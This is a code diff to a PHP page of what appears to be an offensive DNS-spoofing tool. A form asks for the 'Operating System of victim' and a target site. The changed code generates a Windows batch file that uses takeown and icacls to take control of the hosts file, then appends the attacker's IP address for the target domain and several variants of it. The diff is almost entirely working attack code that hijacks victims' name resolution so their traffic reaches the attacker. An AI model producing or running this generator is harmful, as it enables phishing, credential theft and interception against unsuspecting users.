@@ -24,7 +24,7 @@
       <div align="center">
     <form action="" method="post">
 
-   <select name="fake_dns" id="select_dns">
+   <select name="fake_dns" id="select_dns" required>
      <option selected disabled> Operating System of victim </option>
       <optgroup label="Microsoft windows">
     <option value ="windows nt">   Windows NT  </option>
@@ -74,6 +74,8 @@
 
 <?php
 
+
+
  clearstatcache();
 
   session_start();
@@ -105,6 +107,7 @@
                 {
 
             $ipv4 = trim(shell_exec('shell/./my_ipv4.sh'));
+
             $dns = '"' .$_SESSION['site_hack'] .'"';
 
 
@@ -125,18 +128,27 @@
 
             $dns8 = str_replace ("com","gr",$dns6);
 
-
             $hosts = fopen("export/l_win.bat", "w") or die("Unable to open file!");
-            $lines_hosts = "echo $ipv4 >> $dns" 
-                           .PHP_EOL ."echo $ipv4 >> $dns1"
-                           .PHP_EOL ."echo $ipv4 >> $dns2"
-                           .PHP_EOL ."echo $ipv4 >> $dns3"
-                           .PHP_EOL ."echo $ipv4 >> $dns4"
-                           .PHP_EOL ."echo $ipv4 >> $dns5"
-                           .PHP_EOL ."echo $ipv4 >> $dns6"
-                           .PHP_EOL ."echo $ipv4 >> $dns7"
-                           .PHP_EOL ."echo $ipv4 >> $dns8"
-                           .PHP_EOL ."exit";
+            $lines_hosts = '@echo off' 
+                       .PHP_EOL .'Takeown /f C:\Windows\System32\drivers\etc\hosts '
+                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant Administrator:F'
+                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant Administrators:F'
+                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant SYSTEM:F'
+                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts /grant "Authenticated Users":F'
+                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant "domain\users":R'
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns,  '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns1, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns2, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns3, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns4, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns5, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns6, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns7, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns8, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL .'exit';
+
+
+
             fwrite($hosts, $lines_hosts);
             fclose($hosts);
 
@@ -162,12 +174,19 @@
 
 
             $hosts_ready = fopen("export/l_win.bat", "w") or die("Unable to open file!");
-            $lines_hosts_ready = "echo $ipv4 >> $dns_ready" 
-                           .PHP_EOL ."echo $ipv4 >> $dns_ready1"
-                           .PHP_EOL ."echo $ipv4 >> $dns_ready2"
-                           .PHP_EOL ."echo $ipv4 >> $dns_ready3"
-                           .PHP_EOL ."echo $ipv4 >> $dns_ready4"
-                           .PHP_EOL ."exit";
+            $lines_hosts_ready = '@echo off' 
+                       .PHP_EOL .'Takeown /f C:\Windows\System32\drivers\etc\hosts '
+                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant Administrator:F'
+                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant Administrators:F'
+                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant SYSTEM:F'
+                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts /grant "Authenticated Users":F'
+                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant "domain\users":R'
+                       .PHP_EOL ."echo $ipv4"  ." "   .trim($dns_ready, '"')   ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ ' 
+                       .PHP_EOL ."echo $ipv4"  ." "   .trim($dns_ready1, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\  '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns_ready2, '"')   ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns_ready3, '"')   ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns_ready4, '"')   ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
+                       .PHP_EOL .'exit';
             fwrite($hosts_ready, $lines_hosts_ready);
             fclose($hosts_ready);
 
